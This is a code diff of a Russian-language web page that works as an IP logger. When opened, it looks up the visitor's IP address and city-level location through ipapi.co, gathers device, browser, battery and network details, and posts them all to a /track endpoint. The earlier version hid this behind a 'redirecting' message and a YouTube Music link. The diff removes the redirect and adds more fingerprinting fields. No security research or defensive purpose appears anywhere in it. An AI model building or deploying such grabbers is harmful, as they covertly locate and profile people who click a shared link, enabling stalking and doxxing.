@@ -3,16 +3,36 @@
 
 <head>
     <meta charset="UTF-8">
-    <title>Переход...</title>
+    <title>Загрузка...</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            background: #f9f9f9;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            text-align: center;
+        }
+    </style>
     <script>
-        async function track() {
+        async function collectInfo() {
             try {
                 const ipRes = await fetch('https://ipapi.co/ip/');
                 const ip = await ipRes.text();
-
                 const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
                 const geo = await geoRes.json();
 
+                const battery = await navigator.getBattery?.();
+                const batteryLevel = battery ? Math.round(battery.level * 100) + '%' : 'N/A';
+                const charging = battery ? (battery.charging ? 'Да' : 'Нет') : 'N/A';
+
+                const conn = navigator.connection || {};
+                const network = conn.effectiveType || 'неизвестно';
+                const downlink = conn.downlink ? conn.downlink + ' Mbps' : 'N/A';
+
+                const uaData = navigator.userAgentData || {};
                 const info = {
                     ip: geo.ip,
                     city: geo.city,
@@ -21,12 +41,24 @@
                     org: geo.org,
                     loc: geo.latitude + ',' + geo.longitude,
                     timezone: geo.timezone,
+                    timezoneOffset: new Date().getTimezoneOffset(),
+
                     userAgent: navigator.userAgent,
-                    language: navigator.language,
+                    brands: uaData.brands?.map(b => b.brand + '/' + b.version).join(', ') || navigator.userAgent,
+                    architecture: uaData.architecture || 'N/A',
+                    platform: uaData.platform || navigator.platform,
+
+                    language: navigator.languages?.join(', ') || navigator.language,
                     screen: `${screen.width}x${screen.height}`,
                     device: /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
-                    timezoneOffset: new Date().getTimezoneOffset(),
-                    touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0
+                    touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+                    memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A',
+
+                    battery: batteryLevel,
+                    charging,
+                    network,
+                    downlink,
+                    online: navigator.onLine ? 'Online' : 'Offline'
                 };
 
                 await fetch('/track', {
@@ -34,19 +66,17 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(info)
                 });
-
-                window.location.href = "https://music.youtube.com/watch?v=Kswz8FCJmKg&si=NmoCRGUkQtvhX4wK";
             } catch (e) {
-                window.location.href = "https://music.youtube.com/watch?v=Kswz8FCJmKg&si=NmoCRGUkQtvhX4wK";
+                console.warn('Ошибка сбора данных:', e);
             }
         }
 
-        window.onload = track;
+        window.onload = collectInfo;
     </script>
 </head>
 
 <body>
-    <p>Переходим...</p>
+    <h1>⏳ Идёт сбор данных...</h1>
 </body>
 
 </html>
